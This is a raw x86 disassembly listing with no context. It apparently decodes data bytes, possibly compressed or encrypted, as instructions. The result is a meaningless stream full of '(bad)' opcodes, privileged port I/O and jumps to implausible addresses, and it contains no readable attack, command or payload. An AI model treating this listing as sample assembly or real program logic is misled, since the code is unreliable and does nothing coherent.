  420287:	lods   al,BYTE PTR ds:[esi]
  420288:	rol    esp,1
  42028a:	loopne 0x4202a7
  42028c:	(bad)  
  42028e:	mul    dh
  420290:	cmp    dh,BYTE PTR [ebx-0x3]
  420293:	data16 test cl,bl
  420296:	dec    edi
  420297:	adc    al,0x47
  420299:	cwde   
  42029a:	fstp   st(6)
  42029c:	mov    al,ds:0x1c6f174d
  4202a1:	adc    ebp,esi
  4202a3:	adc    dh,BYTE PTR [edi]
  4202a5:	mov    ah,0xcd
  4202a7:	push   esp
  4202a8:	xchg   ebp,eax
  4202a9:	push   DWORD PTR [edx+0x218e93f3]
  4202af:	not    DWORD PTR [ecx]
  4202b1:	push   ds
  4202b2:	nop
  4202b3:	mov    ds:0xea4f2603,eax
  4202b8:	scas   al,BYTE PTR es:[edi]
  4202b9:	jmp    0x420241
  4202bb:	aas    
  4202bc:	fimul  DWORD PTR [edi-0x3a8eff94]
  4202c2:	loopne 0x420266
  4202c4:	adc    eax,0xe429ba50
  4202c9:	daa    
  4202ca:	sbb    DWORD PTR [edx+0x2b],ebp
  4202cd:	(bad)  
  4202cf:	lods   al,BYTE PTR ds:[esi]
  4202d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202d1:	ret    
  4202d2:	iret   
  4202d3:	mov    WORD PTR [esi+ecx*8],gs
  4202d6:	push   0x857083e3
  4202db:	pop    DWORD PTR [edi*2+0x293298ab]
  4202e2:	rcr    BYTE PTR [esi],0x40
  4202e5:	fimul  WORD PTR [esi-0x49c855c5]
  4202eb:	sub    esi,ebx
  4202ed:	fs cs jnp 0x4b4ae826
  4202f5:	mov    WORD PTR [esi-0xf],gs
  4202f8:	push   eax
  4202f9:	add    al,0xb6
  4202fb:	jl     0x420285
  4202fd:	daa    
  4202fe:	mov    bl,0x6b
  420300:	enter  0xcf11,0xc9
  420304:	xor    al,0x2c
  420306:	ss lahf 
  420308:	stos   BYTE PTR es:[edi],al
  420309:	cwde   
  42030a:	inc    esp
  42030b:	outs   dx,BYTE PTR ds:[esi]
  42030c:	arpl   WORD PTR [eax],bp
  42030e:	mov    cl,0x34
  420310:	push   esp
  420311:	pop    esi
  420312:	test   al,0xb4
  420314:	and    ah,BYTE PTR [ecx]
  420316:	push   ds
  420317:	enter  0x1332,0x96
  42031b:	into   
  42031c:	sbb    bh,dl
  42031e:	xor    al,0xf7
  420321:	into   
  420322:	iret   
  420323:	sub    dl,cl
  420325:	jle    0x4202f1
  420327:	sub    DWORD PTR [ebp+ebp*4+0x8cbb6d7],esp
  42032e:	dec    esp
  42032f:	fisttp WORD PTR [ecx-0x3b]
  420332:	popa   
  420333:	shl    BYTE PTR [esp+esi*1+0x5ac67dd1],0xa3
  42033b:	push   cs
  42033c:	nop
  42033d:	inc    eax
  42033e:	nop
  42033f:	mov    esp,0x86defa89
  420344:	fldcw  WORD PTR [ecx]
  420346:	push   esi
  420347:	outs   dx,DWORD PTR ds:[si]
  420349:	sub    edi,eax
  42034b:	dec    ecx
  42034c:	clc    
  42034d:	hlt    
  42034e:	fdiv   QWORD PTR [ebx]
  420350:	sub    al,0xad
  420352:	push   ds
  420353:	sbb    BYTE PTR [ebx+0x32],ch
  420356:	or     DWORD PTR [edi-0x4ef1ffb7],0xaece24c5
  420360:	and    ecx,DWORD PTR [ebp-0x498396bf]
  420366:	push   esi
  420367:	fsubr  st(0),st
  420369:	jmp    DWORD PTR [ebp+ebp*8+0x1d82e4b8]
  420370:	rol    BYTE PTR fs:[edi-0x7e],0x9b
  420375:	dec    edx
  420376:	retf   0x7d76
  420379:	loopne 0x4203ee
  42037b:	cmp    DWORD PTR [eax+0x6b],ecx
  42037e:	mov    ah,0xa4
  420380:	les    esi,FWORD PTR ds:0x8934329
  420386:	mov    WORD PTR [edx],ds
  420388:	mov    eax,ds:0x82a2341a
  42038d:	fmul   DWORD PTR [ecx+0x3c]
  420390:	bnd jmp 0xa9a774f8
  420396:	adc    BYTE PTR ds:0x2bc94958,bl
  42039c:	and    al,0x42
  42039e:	ins    BYTE PTR es:[edi],dx
  42039f:	and    al,0xbf
  4203a1:	inc    DWORD PTR [esi]
  4203a3:	loope  0x4203f7
  4203a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203a6:	or     BYTE PTR [esi-0x1a],bh
  4203a9:	jns    0x420397
  4203ab:	nop
  4203ac:	adc    al,0x7a
  4203ae:	sub    BYTE PTR [edi+0x10],bh
  4203b1:	sub    esi,DWORD PTR [ecx+ebp*1]
  4203b4:	fwait
  4203b5:	(bad)  
  4203b6:	je     0x420387
  4203b8:	out    dx,eax
  4203b9:	jmp    0x42040e
  4203bb:	sbb    BYTE PTR [eax-0x250ae971],al
  4203c1:	xor    eax,0xc0d038d9
  4203c6:	jl     0x42043d
  4203c8:	jno    0x42037c
  4203ca:	push   0x23
  4203cc:	mov    ebp,0x61ea8764
  4203d1:	fstp   st(0)
  4203d3:	scas   al,BYTE PTR es:[edi]
  4203d4:	push   ss
  4203d5:	arpl   WORD PTR [ebx+edi*8+0x3d],ax
  4203d9:	gs xchg esi,eax
  4203db:	inc    edi
  4203dc:	mov    esi,0x96c108d2
  4203e1:	fwait
  4203e2:	stos   DWORD PTR es:[edi],eax
  4203e3:	inc    esi
  4203e4:	mov    ds:0x56b14c3d,eax
  4203e9:	es mov cl,0xa5
  4203ec:	adc    esi,DWORD PTR [edi-0x9]
  4203ef:	test   BYTE PTR [ebx+0x5617b711],bh
  4203f5:	fbld   TBYTE PTR ds:0xd4669f1f
  4203fb:	mov    dh,0x29
  4203fd:	xchg   edi,eax
  4203fe:	iret   
  4203ff:	sbb    al,0xd9
  420401:	inc    esi
  420402:	ja     0x4203dd
  420404:	or     BYTE PTR [eax-0x361ebbbb],dh
  42040a:	imul   di,di,0xd307
  42040f:	push   ds
  420410:	mov    bl,0x8b
  420412:	dec    ecx
  420413:	pusha  
  420414:	cmc    
  420415:	rcl    DWORD PTR [edx],cl
  420417:	and    esi,DWORD PTR [ebx-0x32]
  42041a:	int3   
  42041b:	dec    edx
  42041c:	inc    ebp
  42041d:	(bad)  
  42041e:	mov    ds:0xc56ea388,al
  420423:	rcr    BYTE PTR [edi-0x51],0x94
  420427:	test   al,0xd4
  420429:	enter  0xbe41,0x81
  42042d:	inc    edi
  42042e:	sub    eax,0xb42fc8c0
  420433:	sub    al,0xa7
  420435:	jmp    0xe073:0x33a1b01e
  42043c:	pop    ebp
  42043d:	jl     0x4204b3
  42043f:	mov    ebp,0xd97637af
  420444:	fsubp  st(4),st
  420446:	retf   
  420447:	sbb    dl,al
  420449:	cmp    al,0xc5
  42044b:	mov    dl,0x2a
  42044d:	out    0x9d,eax
  42044f:	outs   dx,BYTE PTR ds:[esi]
  420450:	pop    ecx
  420451:	jle    0x42044d
  420453:	dec    ebp
  420454:	mov    esi,0x2700c999
  420459:	push   esi
  42045a:	sub    ecx,DWORD PTR [eax]
  42045c:	dec    edi
  42045d:	mov    ecx,0xcda18700
  420462:	mov    bl,0xb6
  420464:	xchg   esp,eax
  420465:	xchg   edi,eax
  420466:	push   esi
  420467:	daa    
  420468:	cmc    
  420469:	inc    ecx
  42046a:	inc    esp
  42046b:	imul   ebx,DWORD PTR [ecx],0xffffffba
  42046e:	loope  0x4204ae
  420470:	lods   eax,DWORD PTR ds:[esi]
  420471:	jp     0x42044c
  420473:	outs   dx,DWORD PTR ds:[esi]
  420474:	ja     0x420436
  420476:	divps  xmm2,XMMWORD PTR [ecx-0x43efc460]
  42047d:	mov    ebp,DWORD PTR [edi+0x79ca1cb9]
  420483:	cdq    
  420484:	int3   
  420485:	call   0xa7cbd44e
  42048a:	pop    ss
  42048b:	scas   eax,DWORD PTR es:[edi]
  42048c:	jl     0x420438
  42048e:	stc    
  42048f:	push   esi
  420490:	add    eax,0x3761e34b
  420495:	jecxz  0x4204b3
  420497:	pop    ss
  420498:	bound  esp,QWORD PTR [ebx-0x304b846f]
  42049e:	inc    esi
  42049f:	mov    al,es:0xe7a29cc4
  4204a5:	add    DWORD PTR [eax-0xfd83629],ebx
  4204ab:	sti    
  4204ac:	mov    cl,0x2b
  4204ae:	scas   al,BYTE PTR es:[edi]
  4204af:	sbb    eax,0x86012e26
  4204b4:	jle    0x4204d3
  4204b6:	loop   0x4204a0
  4204b8:	and    BYTE PTR ds:[esi+0x6f5742b1],dh
  4204bf:	enter  0x7b71,0x8d
  4204c3:	mov    bh,0x48
  4204c5:	xchg   esp,eax
  4204c6:	push   edi
  4204c7:	jno    0x420496
  4204c9:	and    eax,0x9d111255
  4204ce:	std    
  4204cf:	adc    BYTE PTR [edi-0x58f9770e],0x49
  4204d6:	repz jo 0x420487
  4204d9:	adc    DWORD PTR [edi+ebx*1+0x2d],0x35
  4204de:	in     eax,dx
  4204df:	gs push ebx
  4204e1:	cdq    
  4204e2:	ss xor eax,edx
  4204e5:	pop    ebx
  4204e6:	add    BYTE PTR [ecx+0x4d178036],ah
  4204ec:	fcom   st(3)
  4204ee:	add    eax,0xa77c38e8
  4204f3:	sbb    eax,0xc85220a2
  4204f8:	int    0x1a
  4204fa:	popa   
  4204fb:	jbe    0x420523
  4204fd:	dec    ecx
  4204fe:	cmp    edx,ecx
  420500:	jne    0x42048c
  420502:	mov    esp,esp
  420504:	sahf   
  420505:	cmp    bl,BYTE PTR [eax-0x37ebd082]
  42050b:	mov    edx,0xc1188aa6
  420510:	xchg   ebp,eax
  420511:	jg     0x4204b0
  420513:	(bad)  
  420515:	aad    0x3f
  420517:	mov    ds:0xf16cba5f,eax
  42051c:	push   eax
  42051d:	div    BYTE PTR [ecx+ebp*1-0x7e11aacd]
  420524:	pop    edi
  420525:	dec    edi
  420526:	iret   
  420527:	adc    ebp,edi
  420529:	push   ecx
  42052a:	mov    bl,BYTE PTR ds:0xa47a93cc
  420530:	test   al,0x37
  420532:	xchg   edx,eax
  420533:	cmp    dl,ch
  420535:	lahf   
  420536:	adc    ebp,DWORD PTR [ecx+0x2a]
  420539:	mov    DWORD PTR [esi+ebp*8+0x552ea896],eax
  420540:	sbb    DWORD PTR [esi-0x64],eax
  420543:	cmp    bh,BYTE PTR [ecx]
  420545:	push   es
  420546:	mov    al,0xdb
  420548:	or     eax,0x78cfb6eb
  42054d:	inc    ebx
  42054e:	outs   dx,BYTE PTR ds:[esi]
  42054f:	mov    cl,0xb6
  420551:	ss fsubr st,st(6)
  420554:	stc    
  420555:	jae    0x4205a3
  420557:	data16 jge 0x42059f
  42055a:	sbb    BYTE PTR [ebx+ebp*2],bl
  42055d:	jae    0x420520
  42055f:	outs   dx,DWORD PTR ds:[esi]
  420560:	into   
  420561:	aam    0xeb
  420563:	add    cl,BYTE PTR [eax]
  420565:	ds add edx,esp
  420568:	fwait
  420569:	add    al,0x9
  42056b:	and    ebp,DWORD PTR [edx+ecx*4-0x530915fa]
  420572:	(bad)  [ebx]
  420574:	xchg   edi,eax
  420575:	(bad)  
  420576:	pop    ebp
  420577:	inc    ebp
  420578:	jno    0x42053b
  42057a:	dec    esp
  42057b:	imul   ecx,ecx,0x76
  42057e:	call   0x33333c08
  420583:	mov    edi,0x7e902626
  420588:	aas    
  420589:	js     0x42050f
  42058b:	and    al,0xa
  42058d:	test   al,0xed
  42058f:	cmp    eax,DWORD PTR [ecx+eax*2]
  420592:	ror    BYTE PTR ds:0x9d549a3a,1
  420598:	maxps  xmm1,xmm1
  42059b:	adc    eax,esi
  42059d:	mov    ebx,0xb8e9b37f
  4205a2:	cld    
  4205a3:	fmul   st(7),st
  4205a5:	outs   dx,DWORD PTR ds:[esi]
  4205a6:	adc    eax,0x36e5e3c8
  4205ab:	mov    ah,0x83
  4205ad:	fld    DWORD PTR [eax+0x4d55cc83]
  4205b3:	jbe    0x420565
  4205b5:	int    0x7b
  4205b7:	ins    BYTE PTR es:[edi],dx
  4205b8:	arpl   WORD PTR [ebx+edx*1],cx
  4205bb:	xchg   ebp,eax
  4205bc:	imul   eax,DWORD PTR [ebp+edi*8-0x80],0x49
  4205c1:	xchg   ecx,eax
  4205c2:	push   edx
  4205c3:	xchg   ecx,edx
  4205c5:	jo     0x420596
  4205c7:	in     eax,0xfb
  4205c9:	fstp   DWORD PTR [eax+0x2e]
  4205cc:	dec    edi
  4205cd:	inc    edx
  4205ce:	sbb    BYTE PTR [ebx],bl
  4205d0:	data16 in al,0x5c
  4205d3:	rcr    DWORD PTR [ebx],cl
  4205d5:	dec    ecx
  4205d6:	add    cl,BYTE PTR [edx]
  4205d8:	inc    edx
  4205d9:	jmp    0x42058d
  4205db:	in     al,0x7
  4205dd:	mov    bh,0x92
  4205df:	add    BYTE PTR [eax+0x5c],bh
  4205e2:	sbb    DWORD PTR [ebx-0x1ce7cc97],ecx
  4205e8:	call   0x1b59:0x3269253b
  4205ef:	test   eax,0xc3c27456
  4205f4:	in     al,0x14
  4205f6:	mov    eax,ds:0x9f29de17
  4205fb:	inc    edi
  4205fc:	popf   
  4205fd:	add    eax,0x866ee0a2
  420602:	xchg   edx,eax
  420603:	mov    dl,0xc4
  420605:	sbb    cl,BYTE PTR [edx-0x68]
  420608:	cmp    eax,0xece6a9ce
  42060d:	in     al,0x16
  42060f:	xchg   edx,eax
  420610:	adc    edx,esi
  420612:	lock xchg DWORD PTR [ecx+0x22],esp
  420616:	repnz dec edi
  420618:	stc    
  420619:	fcmovnbe st,st(0)
  42061b:	xchg   ebp,eax
  42061c:	xlat   BYTE PTR ds:[ebx]
  42061d:	add    BYTE PTR [edx+0x4dc799cd],ch
  420623:	sub    BYTE PTR [esi],cl
  420625:	(bad)  
  420626:	std    
  420627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420628:	or     eax,0xdfa58134
  42062d:	cmp    BYTE PTR [esi-0x48],bl
  420630:	(bad)  
  420631:	sub    DWORD PTR [edx+0x77],ecx
  420634:	iret   
  420635:	and    eax,0x39d8269d
  42063a:	cmp    ecx,DWORD PTR ds:0xc5b9792a
  420640:	sbb    ah,BYTE PTR [ebx]
  420642:	push   eax
  420643:	(bad)  [esi-0x6d]
  420646:	out    dx,eax
  420647:	mov    edi,0xbb5a3ec9
  42064c:	adc    ch,ah
  42064e:	xor    BYTE PTR [ebx+ecx*8],cl
  420651:	aaa    
  420652:	mov    BYTE PTR [edi+eax*8+0x5e],al
  420656:	push   esi
  420657:	mov    ds:0xb494ef2e,al
  42065c:	call   0x8099d734
  420661:	and    BYTE PTR [edi+0x7cc1b19],bh
  420667:	or     al,0xeb
  420669:	pop    esi
  42066a:	mov    cl,BYTE PTR [edi-0x14]
  42066d:	fld    QWORD PTR [esp+esi*4-0x73f66a5d]
  420674:	push   eax
  420675:	cmp    BYTE PTR ds:0x26d6d074,bh
  42067b:	test   eax,0xac2f5d78
  420680:	cmp    BYTE PTR [edx+eax*1+0x2eba7cf2],bl
  420687:	(bad)  
  420688:	call   FWORD PTR [edi+0x5311c832]
  42068e:	inc    ecx
  42068f:	jns    0x42066b
  420691:	neg    DWORD PTR [edx]
  420693:	xor    eax,0xd2add762
  420698:	(bad)  
  420699:	daa    
  42069a:	test   eax,0xa498295c
  42069f:	and    eax,0x61baa5e4
  4206a4:	in     eax,dx
  4206a5:	xor    al,0x25
  4206a7:	cmp    BYTE PTR [edx-0x376ac423],0x1
  4206ae:	xchg   edx,eax
  4206af:	adc    eax,0xb8dea10d
  4206b4:	test   DWORD PTR [ebx],edx
  4206b6:	inc    ebp
  4206b7:	jae    0x420674
  4206b9:	mov    cl,0xfc
  4206bb:	mov    ch,dl
  4206bd:	inc    edx
  4206be:	adc    BYTE PTR [edi-0x65f3d541],ch
  4206c4:	scas   eax,DWORD PTR es:[edi]
  4206c5:	push   esp
  4206c6:	js     0x420746
  4206c8:	inc    esi
  4206c9:	scas   eax,DWORD PTR es:[edi]
  4206ca:	adc    DWORD PTR [ecx+eiz*8],esi
  4206cd:	pusha  
  4206ce:	dec    ecx
  4206cf:	mov    ds:0x54e9c22a,al
  4206d4:	scas   eax,DWORD PTR es:[edi]
  4206d5:	es mov ch,0x26
  4206d8:	mov    ecx,0x5438126
  4206dd:	lahf   
  4206de:	pop    ds
  4206df:	pop    ecx
  4206e0:	sub    BYTE PTR cs:[edx],bh
  4206e3:	jo     0x42074c
  4206e5:	jae    0x420689
  4206e7:	out    dx,eax
  4206e8:	add    al,0x26
  4206ea:	cmp    ah,BYTE PTR [ebx-0x7d53d14c]
  4206f0:	sbb    al,0xc0
  4206f2:	leave  
  4206f3:	pop    esi
  4206f4:	pop    esi
  4206f5:	aad    0x1c
  4206f7:	lock aaa 
  4206f9:	mov    edi,0x21b9084a
  4206fe:	inc    eax
  4206ff:	inc    ecx
  420700:	push   ds
  420701:	outs   dx,BYTE PTR ds:[esi]
  420702:	mov    bl,0x42
  420704:	cli    
  420705:	cli    
  420706:	ins    BYTE PTR es:[edi],dx
  420707:	jmp    0x4206b5
  420709:	test   al,0xf6
  42070b:	jge    0x420701
  42070d:	pop    ebp
  42070e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42070f:	or     al,0xc2
  420711:	and    eax,0x9ada5a43
  420716:	js     0x420771
  420718:	jmp    0x7b58:0x8fb61e6e
  42071f:	in     eax,dx
  420720:	jmp    0x420719
  420722:	ins    BYTE PTR es:[edi],dx
  420723:	xlat   BYTE PTR ds:[ebx]
  420724:	sbb    al,0x5b
  420726:	xchg   esp,eax
  420727:	sub    eax,0xb278c9ba
  42072c:	mov    ch,0xa7
  42072e:	repz push ebp
  420730:	das    
  420731:	js     0x420757
  420733:	fwait
  420734:	bound  ecx,QWORD PTR [esi+0x4d]
  420737:	enter  0x572,0x15
  42073b:	mov    ch,BYTE PTR [ecx]
  42073d:	sbb    eax,0xcbb4999b
  420742:	cmp    bl,dh
  420744:	out    0x15,al
  420746:	aas    
  420747:	cmp    ecx,0xfffffff7
  42074a:	dec    ebp
  42074b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42074c:	lods   al,BYTE PTR ds:[esi]
  42074d:	imul   esi,DWORD PTR [ecx+0x33],0x21
  420751:	out    0x9c,eax
  420753:	sub    BYTE PTR [ecx],al
  420755:	xchg   ebx,eax
  420756:	dec    edx
  420757:	mov    edx,0xc29afd25
  42075c:	cld    
  42075d:	ds xchg esi,eax
  42075f:	jl     0x4207bc
  420761:	cmp    BYTE PTR [edx+esi*1-0x7ef7ee34],dl
  420768:	dec    edi
  420769:	sub    eax,0xdd32116b
  42076e:	cs push eax
  420770:	sbb    ch,ch
  420772:	fnstsw WORD PTR [ebx-0x240b3988]
  420778:	mov    edi,0xf47b831b
  42077d:	es sbb cl,0x1a
  420781:	popa   
  420782:	sub    al,0x14
  420784:	cmc    
  420785:	sub    al,0x63
  420787:	jecxz  0x42073c
  420789:	and    eax,0x9f817a66
  42078e:	dec    eax
  42078f:	mov    eax,DWORD PTR [ecx-0x6cd6d496]
  420795:	and    eax,0xa81a881
  42079a:	lea    ebx,[ebx+0x9]
  42079d:	sahf   
  42079e:	cdq    
  42079f:	(bad)  
  4207a0:	(bad)  
  4207a1:	xor    BYTE PTR [ebx+eiz*4],ah
  4207a4:	inc    esi
  4207a5:	cmp    ch,BYTE PTR [eax+0x63]
  4207a8:	add    ebx,DWORD PTR [edx+0x24c1f830]
  4207ae:	(bad)  
  4207af:	repz (bad) 
  4207b2:	jbe    0x42081b
  4207b4:	ins    BYTE PTR es:[edi],dx
  4207b5:	data16 sub al,0x47
  4207b8:	neg    DWORD PTR [ecx-0x7f]
  4207bb:	out    0x21,al
  4207bd:	aaa    
  4207be:	int    0xee
  4207c0:	ret    0xded9
  4207c3:	dec    edx
  4207c4:	push   edi
  4207c5:	fstp   DWORD PTR [ecx-0xc22c2d4]
  4207cb:	lock in al,dx
  4207cd:	(bad)  
  4207ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207cf:	xchg   ebx,eax
  4207d0:	xlat   BYTE PTR ds:[ebx]
  4207d1:	ja     0x420815
  4207d3:	and    al,0x96
  4207d5:	jae    0x420767
  4207d7:	mov    al,ds:0xffca3cd1
  4207dc:	sbb    esi,DWORD PTR [eax-0x655c1574]
  4207e2:	and    al,0xe9
  4207e4:	sub    BYTE PTR [ecx],0x77
  4207e7:	jbe    0x4207a3
  4207e9:	sbb    ah,ah
  4207eb:	xchg   DWORD PTR [esi+0x70eae596],eax
  4207f1:	bound  esi,QWORD PTR [edx+0x15]
  4207f4:	adc    ch,al
  4207f6:	loop   0x4207db
  4207f8:	out    dx,al
  4207f9:	push   ss
  4207fa:	pop    edx
  4207fb:	or     DWORD PTR [eax],edx
  4207fd:	unpcklps xmm5,xmm7
  420800:	fidiv  WORD PTR [ebx+0x65]
  420803:	clc    
  420804:	addr16 inc ebx
  420806:	jmp    0x420876
  420808:	aam    0xd3
  42080a:	mov    ebp,DWORD PTR [ebp+eiz*1-0x181cb21b]
  420811:	pop    ebx
  420812:	mov    esp,0xe06fc60b
  420817:	or     DWORD PTR [eax+0x76],ecx
  42081a:	sbb    al,0xd3
  42081c:	call   0xdb944e75
  420821:	scas   eax,DWORD PTR es:[edi]
  420822:	cmc    
  420823:	mov    ds:0x403e56a8,eax
  420828:	hlt    
  420829:	xchg   ebp,eax
  42082a:	push   ecx
  42082c:	lock fldcw WORD PTR [ebx]
  42082f:	pop    esi
  420830:	xchg   ebp,eax
  420831:	(bad)  
  420832:	mov    al,ds:0xaa81bf35
  420837:	jmp    0x4207ff
  420839:	outs   dx,BYTE PTR ds:[esi]
  42083a:	mov    gs,ebp
  42083c:	dec    ebx
  42083d:	clc    
  42083e:	hlt    
  42083f:	mov    edi,DWORD PTR [ecx+edi*2]
  420842:	mov    ah,0x82
  420844:	or     ebx,ecx
  420846:	ret    0xe436
  420849:	xor    bl,bh
  42084b:	in     eax,dx
  42084c:	js     0x420886
  42084e:	nop
  42084f:	xor    BYTE PTR [esi-0x3ac77b84],ah
  420855:	sbb    ecx,DWORD PTR [eax]
  420857:	adc    DWORD PTR [ebp-0x49a9b6f9],ecx
  42085d:	les    ebx,FWORD PTR [esi-0x64af5a39]
  420863:	pop    ds
  420864:	inc    ebp
  420865:	in     eax,0x89
  420867:	out    dx,eax
  420868:	js     0x4208da
  42086a:	in     eax,dx
  42086b:	mov    WORD PTR [esi-0x1c8efc4d],cs
  420871:	ss jb  0x42080e
  420874:	cdq    
  420875:	add    DWORD PTR fs:[edi+0x7f],edx
  420879:	adc    bl,BYTE PTR [eax]
  42087b:	xchg   edx,eax
  42087c:	fst    QWORD PTR [eax+eax*2-0x32ace0a]
  420883:	and    al,0x8a
  420885:	and    eax,0x6dc35bdd
  42088a:	mov    dl,BYTE PTR [ecx-0x2e7d43a2]
  420890:	cmc    
  420891:	mov    dh,0xaa
  420893:	arpl   sp,sp
  420895:	rcr    al,cl
  420897:	(bad)  
  42089a:	out    dx,al
  42089b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42089c:	jle    0x42084b
  42089e:	fadd   st,st(1)
  4208a0:	outs   dx,DWORD PTR ds:[esi]
  4208a1:	dec    eax
  4208a2:	inc    edi
  4208a3:	push   ebp
  4208a4:	push   ss
  4208a5:	dec    ecx
  4208a6:	ds (bad) 
  4208a8:	es int 0xda
  4208ab:	and    esi,DWORD PTR [ecx+ebp*4+0x52d4387c]
  4208b2:	stc    
  4208b3:	fnstcw WORD PTR [edx+edi*2+0x3c94fbed]
  4208ba:	inc    ebx
  4208bb:	push   ds
  4208bc:	xchg   ebp,eax
  4208bd:	scas   al,BYTE PTR es:[edi]
  4208be:	xchg   ebp,eax
  4208bf:	push   ss
  4208c0:	outs   dx,BYTE PTR ds:[esi]
  4208c1:	or     al,0x1d
  4208c3:	mov    bl,0x26
  4208c5:	push   edx
  4208c6:	mov    ah,dl
  4208c8:	sbb    eax,0x5d7f7d70
  4208cd:	pop    ebp
  4208ce:	xchg   ecx,eax
  4208cf:	push   ds
  4208d0:	mov    cl,0xa
  4208d2:	ds xor al,0x18
  4208d5:	add    ecx,esp
  4208d7:	push   ss
  4208d8:	xlat   BYTE PTR ds:[ebx]
  4208d9:	sbb    ecx,eax
  4208db:	sbb    DWORD PTR [edi],ebx
  4208dd:	loop   0x42095e
  4208df:	sbb    bh,ch
  4208e1:	(bad)
  4208e6:	jg     0x4208b5
  4208e8:	mov    eax,0xb01a6805
  4208ed:	cmp    edx,DWORD PTR [edi]
  4208ef:	xchg   ecx,eax
  4208f0:	mov    ebx,0x5c9d21f7
  4208f5:	mov    ecx,DWORD PTR [ecx]
  4208f7:	jge    0x420893
  4208f9:	mov    ecx,0xc86c5171
  4208fe:	jb     0x420908
  420900:	add    edx,DWORD PTR [edx+0x1dbbc2f]
  420906:	inc    edi
  420907:	and    BYTE PTR [edx+0x3835a48e],0xc
  42090e:	cmp    al,0x3e
  420910:	fcmovbe st,st(3)
  420912:	sub    ecx,DWORD PTR [eax]
  420914:	fmul   DWORD PTR [edx-0x14]
  420917:	sub    esi,0x70
  42091a:	aas    
  42091b:	out    0xf,eax
  42091d:	jns    0x420910
  42091f:	inc    ebp
  420920:	push   ebp
  420921:	fbstp  TBYTE PTR [ebx]
  420923:	mov    esp,DWORD PTR [esi-0x1f]
  420926:	loope  0x42090a
  420928:	jl     0x42098b
  42092a:	scas   al,BYTE PTR es:[edi]
  42092b:	and    al,BYTE PTR [esi+0x1c5b91f9]
  420931:	sub    ebx,0x127ad34a
  420937:	les    ebp,FWORD PTR [eax+esi*1]
  42093a:	leave  
  42093b:	mov    cl,0xbf
  42093d:	push   0xfffffff2
  42093f:	or     eax,DWORD PTR ds:0x6efdb9d2
  420945:	lea    esp,[eax]
  420947:	push   eax
  420948:	inc    edx
  420949:	stos   BYTE PTR es:[edi],al
  42094a:	fwait
  42094b:	inc    ecx
  42094d:	push   0x17
  42094f:	repnz and al,0x4b
  420952:	xor    al,0x99
  420954:	ret    
  420955:	mov    esi,0x7fe5450b
  42095a:	jp     0x42090a
  42095c:	enter  0xa435,0x3
  420960:	cmp    ebx,DWORD PTR [edx]
  420962:	mov    eax,ds:0xcc1bdff4
  420967:	ds push esp
  420969:	mov    ah,0xbc
  42096b:	and    al,0x47
  42096d:	and    al,0x36
  42096f:	jb     0x420935
  420971:	push   0xffffff92
  420973:	ins    BYTE PTR es:[edi],dx
  420974:	pop    ss
  420975:	add    BYTE PTR ds:0xd50ab307,cl
  42097b:	stos   BYTE PTR es:[edi],al
  42097c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42097e:	call   0x39d9:0x7ad539a6
  420985:	mov    edi,?
  420987:	in     eax,0x38
  420989:	retf   
  42098a:	inc    edx
  42098b:	outs   dx,DWORD PTR ds:[esi]
  42098c:	add    ch,cl
  42098e:	dec    eax
  42098f:	mov    eax,DWORD PTR [esi+eax*4-0xbfba7be]
  420996:	ret    0xd43a
  420999:	ret    
  42099a:	pusha  
  42099b:	enter  0x5ae7,0xb2
  42099f:	xchg   esi,eax
  4209a0:	pushw  0x2e
  4209a3:	mov    bh,0x57
  4209a5:	mov    esp,0x7e2cae86
  4209aa:	inc    esp
  4209ab:	outs   dx,DWORD PTR ds:[esi]
  4209ac:	sbb    bl,dl
  4209ae:	leave  
  4209af:	(bad)  
  4209b0:	rcr    DWORD PTR [edi-0x17],cl
  4209b3:	push   ebp
  4209b4:	das    
  4209b5:	push   ecx
  4209b6:	movaps XMMWORD PTR ds:0x5fb75e60,xmm4
  4209bd:	cdq    
  4209be:	repnz scas eax,DWORD PTR es:[edi]
  4209c0:	or     ebx,DWORD PTR [ebx-0x3f32009]
  4209c6:	dec    eax
  4209c7:	(bad)  
  4209c8:	pop    edi
  4209c9:	sbb    bh,BYTE PTR [ecx-0x1d]
  4209cc:	xchg   DWORD PTR [edi-0x60],esi
  4209cf:	jbe    0x4209f0
  4209d1:	imul   ebx,ecx,0x1b
  4209d4:	push   esi
  4209d5:	push   eax
  4209d6:	push   ss
  4209d7:	cmp    edi,ecx
  4209d9:	das    
  4209da:	das    
  4209db:	add    edx,DWORD PTR [esi+0x109dbe81]
  4209e1:	nop
  4209e2:	pop    ecx
  4209e3:	push   ebp
  4209e4:	ja     0x420a0b
  4209e6:	(bad)  
  4209e7:	(bad)  
  4209e8:	xchg   esi,edi
  4209ea:	adc    DWORD PTR es:[ebx+0x6a],ecx
  4209ee:	xchg   ecx,eax
  4209ef:	cmp    eax,0x8c26d74a
  4209f4:	cmp    al,0x45
  4209f6:	popa   
  4209f7:	ds stc 
  4209f9:	push   cs
  4209fa:	fnstenv [ecx+0x7]
  4209fd:	lock sbb dh,BYTE PTR [eax+ebp*8]
  420a01:	ds dec edx
  420a03:	retf   
  420a04:	int    0xcf
  420a06:	mov    al,0x2e
  420a08:	std    
  420a09:	enter  0xbb68,0x7f
  420a0d:	mov    esi,0x9cec862f
  420a12:	lock dec esi
  420a14:	jle    0x420a19
  420a16:	push   eax
  420a17:	mov    al,0xcc
  420a19:	loope  0x420a5b
  420a1b:	and    eax,0x598b469b
  420a20:	in     al,0xc2
  420a22:	mov    dl,0x93
  420a24:	xchg   esi,eax
  420a25:	add    bh,ch
  420a27:	out    dx,eax
  420a28:	push   ebx
  420a29:	cs mov ebx,0xd8795aa4
  420a2f:	ins    BYTE PTR es:[edi],dx
  420a30:	or     eax,0xdb7d45ab
  420a35:	lods   eax,DWORD PTR ds:[esi]
  420a36:	mov    esp,DWORD PTR [esi+0xd]
  420a39:	or     al,0x17
  420a3b:	mov    dh,0x3d
  420a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a3e:	jb     0x4209fe
  420a40:	push   edi
  420a41:	dec    esp
  420a42:	cld    
  420a43:	mov    ebp,0x6d1fc981
  420a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
